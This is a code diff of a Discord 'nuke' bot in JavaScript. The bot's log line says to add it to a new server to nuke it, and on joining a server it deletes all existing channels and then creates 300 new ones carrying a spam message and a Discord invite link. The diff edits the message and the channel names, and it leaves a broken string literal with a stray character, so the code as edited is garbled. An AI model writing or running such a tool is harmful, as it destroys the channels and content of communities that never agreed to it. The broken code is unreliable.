@@ -30,9 +30,9 @@ console.log(`ADD THE BOT TO A NEW SERVER TO NUKE IT !`)
 
 const BOT_TOKEN = "YOUR_BOT_TOKEN"; 
 
-const channelnum = 300; // Default number of new channels
-const customMessage = `@everyone NUKED BY LYKS
->discord.gg/lyks`; // Message to send in each new channel
+const channelnum = 300; 
+const customMessage = `VK ON TOP`
+>discord.gg/lyks`; l
 
 client.once("ready", () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -43,8 +43,7 @@ client.on("guildCreate", async (guild) => {
     console.log(`Joined new server: ${guild.name}`);
     blockingWait(2000);
     try {
-        // Delete all existing channels
-        const channels = guild.channels.cache;
+           const channels = guild.channels.cache;
         for (const channel of channels.values()) {
             try {
                 await channel.delete();
@@ -60,7 +59,7 @@ client.on("guildCreate", async (guild) => {
         for (let i = 1; i <= channelnum; i++) {
             try {
                 const newChannel = await guild.channels.create({
-                    name: `nuked-by-lyks-${i}`,
+                    name: `Your-channel-name-${i}`,
                     type: 0, // Type 0 = text channel
                 });
                 createdChannels.push(newChannel);
